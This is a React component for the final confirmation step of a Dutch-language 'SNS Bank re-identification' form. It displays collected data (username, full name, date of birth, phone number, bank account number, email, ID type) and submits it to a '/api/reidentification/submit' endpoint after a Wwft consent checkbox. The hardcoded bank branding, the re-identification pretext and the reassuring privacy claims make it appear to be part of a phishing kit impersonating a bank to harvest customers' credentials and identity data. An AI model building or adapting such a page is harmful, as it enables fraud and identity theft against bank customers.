import { useState } from 'react';
import { useLocation } from 'wouter';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useMutation } from '@tanstack/react-query';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Checkbox } from '@/components/ui/checkbox';
import { useFormStore } from '@/hooks/use-form-store';
import { useTranslation } from '@/lib/translations';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { CheckCircle, Shield, FileCheck } from 'lucide-react';

const step4Schema = z.object({
  consent: z.boolean().refine(val => val === true, "Toestemming is verplicht"),
});

type Step4Data = z.infer<typeof step4Schema>;

export default function Step4() {
  const [, setLocation] = useLocation();
  const { formData, updateFormData, setCurrentStep, isEnglish } = useFormStore();
  const t = useTranslation(isEnglish);
  const { toast } = useToast();

  const form = useForm<Step4Data>({
    resolver: zodResolver(step4Schema),
    defaultValues: {
      consent: formData.consent || false,
    },
  });

  const submitMutation = useMutation({
    mutationFn: async (data: any) => {
      return await apiRequest('POST', '/api/reidentification/submit', data);
    },
    onSuccess: () => {
      setLocation('/success');
    },
    onError: (error: any) => {
      toast({
        title: "Fout bij verzenden",
        description: error.message || "Er is een fout opgetreden bij het verzenden van je gegevens",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: Step4Data) => {
    updateFormData(data);
    const completeFormData = { ...formData, ...data };
    submitMutation.mutate(completeFormData);
  };

  const handleBack = () => {
    setCurrentStep(2);
    setLocation('/step-3');
  };

  const getSummaryData = () => {
    const accountTypesText = formData.accountTypes?.map(type => {
      return type === 'private' ? 'Particulier' : 
             type === 'business' ? 'Zakelijk' : 'Creditcard';
    }).join(', ') || '';

    const missingDataText = formData.missingData?.map(type => {
      return type === 'middlenames' ? 'Tussenvoegsel/voornamen' :
             type === 'address' ? 'Adresgegevens' :
             type === 'birthplace' ? 'Geboorteplaats' : 'Nationaliteit';
    }).join(', ') || '';

    const idTypeText = formData.idType === 'passport' ? 'Paspoort' :
                      formData.idType === 'id-card' ? 'Identiteitskaart' : 'Rijbewijs';

    return {
      username: formData.username || '',
      fullName: formData.fullName || '',
      accountTypes: accountTypesText,
      idType: idTypeText,
      dateOfBirth: formData.dateOfBirth || '',
      phoneNumber: formData.phoneNumber || '',
      accountNumber: formData.accountNumber || '',
      fullEmail: formData.fullEmail || '',
      missingData: missingDataText,
    };
  };

  const summaryData = getSummaryData();

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-orange-50">
      {/* SNS Header */}
      <div className="bg-primary text-white py-4">
        <div className="max-w-2xl mx-auto px-4 sm:px-6">
          <div className="flex items-center gap-3">
            <Shield className="h-8 w-8" />
            <div>
              <h1 className="text-xl sm:text-2xl font-bold" data-testid="sns-logo">SNS Bank</h1>
              <p className="text-orange-100 text-sm">Bevestiging en verzending</p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 sm:px-6 py-8 sm:py-12">
        <Card className="shadow-2xl border-0">
          <CardContent className="pt-8 pb-8">
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto mb-4">
                <FileCheck className="h-8 w-8 text-white" />
              </div>
              <h2 className="text-2xl font-bold text-secondary mb-2" data-testid="step-title">
                Bevestiging
              </h2>
              <p className="text-muted-foreground text-sm">
                Controleer je gegevens en voltooi het proces
              </p>
            </div>
          
          {/* Summary Section */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6">
            <div className="flex items-center gap-3 mb-4">
              <CheckCircle className="h-5 w-5 text-blue-600" />
              <h3 className="text-lg font-semibold text-blue-900" data-testid="summary-title">
                Overzicht van je gegevens
              </h3>
            </div>
            <div className="space-y-3 text-accent-foreground">
              <div data-testid="summary-username">
                <strong>Gebruikersnaam:</strong> {summaryData.username}
              </div>
              <div data-testid="summary-fullname">
                <strong>Volledige naam:</strong> {summaryData.fullName}
              </div>
              <div data-testid="summary-accounttypes">
                <strong>Rekeningtypes:</strong> {summaryData.accountTypes}
              </div>
              <div data-testid="summary-idtype">
                <strong>ID type:</strong> {summaryData.idType}
              </div>
              <div data-testid="summary-dateofbirth">
                <strong>Geboortedatum:</strong> {summaryData.dateOfBirth}
              </div>
              <div data-testid="summary-phonenumber">
                <strong>Telefoonnummer:</strong> {summaryData.phoneNumber}
              </div>
              <div data-testid="summary-accountnumber">
                <strong>Rekeningnummer:</strong> {summaryData.accountNumber}
              </div>
              <div data-testid="summary-email">
                <strong>E-mailadres:</strong> {summaryData.fullEmail}
              </div>
              <div data-testid="summary-missingdata">
                <strong>Ontbrekende gegevens:</strong> {summaryData.missingData}
              </div>
            </div>
          </div>

          {/* Important Notice */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-6 mb-6">
            <h3 className="text-lg font-semibold mb-2 text-yellow-900" data-testid="important-title">
              Belangrijk
            </h3>
            <ul className="text-yellow-800 space-y-2">
              <li data-testid="important-privacy">
                • Je gegevens worden veilig opgeslagen volgens de geldende privacywetgeving
              </li>
              <li data-testid="important-usage">
                • We gebruiken je gegevens alleen voor identificatie en niet voor marketing
              </li>
              <li data-testid="important-legal">
                • Dit proces is vereist volgens de Wwft wetgeving
              </li>
            </ul>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="consent"
                render={({ field }) => (
                  <FormItem className="flex flex-row items-start space-x-3 space-y-0">
                    <FormControl>
                      <Checkbox
                        checked={field.value}
                        onCheckedChange={field.onChange}
                        data-testid="checkbox-consent"
                      />
                    </FormControl>
                    <div className="space-y-1 leading-none">
                      <FormLabel className="text-sm" data-testid="label-consent">
                        Ik geef toestemming voor het verwerken van mijn gegevens voor re-identificatie volgens de Wwft wetgeving en ga akkoord met de privacyvoorwaarden van SNS Bank.
                      </FormLabel>
                      <FormMessage />
                    </div>
                  </FormItem>
                )}
              />

              <div className="flex justify-between mt-8">
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleBack}
                  disabled={submitMutation.isPending}
                  data-testid="button-back"
                >
                  {t('back')}
                </Button>
                <Button 
                  type="submit"
                  className="bg-primary text-primary-foreground px-8 py-3 font-semibold hover:opacity-90"
                  disabled={submitMutation.isPending}
                  data-testid="button-submit"
                >
                  {submitMutation.isPending ? 'Verzenden...' : t('submit')}
                </Button>
              </div>
            </form>
          </Form>
        </CardContent>
      </Card>
      </div>
    </div>
  );
}
